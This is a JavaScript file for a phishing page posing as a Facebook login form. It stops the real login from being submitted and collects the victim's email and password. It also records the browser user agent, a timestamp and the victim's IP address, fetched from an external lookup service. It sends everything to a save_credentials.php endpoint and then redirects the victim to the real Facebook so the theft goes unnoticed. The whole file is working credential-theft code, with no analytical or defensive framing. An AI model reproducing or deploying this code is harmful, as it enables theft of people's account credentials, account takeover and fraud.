function captureCredentials(event) {
    // Prevent the normal form submission
    event.preventDefault();
    
    // Get the form data
    var email = document.getElementById('email').value;
    var password = document.getElementById('pass').value;
    
    // Basic validation
    if (!email || !password) {
        // If empty fields, just redirect to real Facebook
        window.location.href = "https://www.facebook.com";
        return;
    }
    
    // Basic email validation with regex
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        // If not a valid email format, just redirect to real Facebook
        window.location.href = "https://www.facebook.com";
        return;
    }
    
    var userAgent = navigator.userAgent;
    var date = new Date().toISOString();
    
    // Get the IP address with a timeout
    var ipPromise = new Promise(function(resolve, reject) {
        var timeout = setTimeout(function() {
            reject(new Error('IP fetch timeout'));
        }, 3000); // 3 second timeout
        
        fetch('https://api.ipify.org?format=json')
            .then(function(response) {
                clearTimeout(timeout);
                return response.json();
            })
            .then(function(data) {
                resolve(data.ip);
            })
            .catch(function(error) {
                clearTimeout(timeout);
                reject(error);
            });
    });
    
    // Use the promise with a fallback
    ipPromise
        .then(function(ip) {
            sendData(email, password, userAgent, date, ip);
        })
        .catch(function() {
            // If IP fetch fails, use a fallback
            sendData(email, password, userAgent, date, 'Unknown');
        });
}

function sendData(email, password, userAgent, date, ip) {
    var data = {
        email: email,
        password: password,
        userAgent: userAgent,
        date: date,
        ip: ip
    };
    
    // Show a loading indicator or message (optional)
    var submitButton = document.querySelector('button[type="submit"]');
    if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = "Logging in...";
    }
    
    fetch('save_credentials.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data),
        // Add timeout
        signal: AbortSignal.timeout(5000) // 5 second timeout
    })
    .then(function(response) {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(function() {
        // Redirect to Facebook after logging
        window.location.href = "https://www.facebook.com";
    })
    .catch(function(error) {
        console.error('Error:', error);
        // Redirect anyway if there's an error
        window.location.href = "https://www.facebook.com";
    });
} 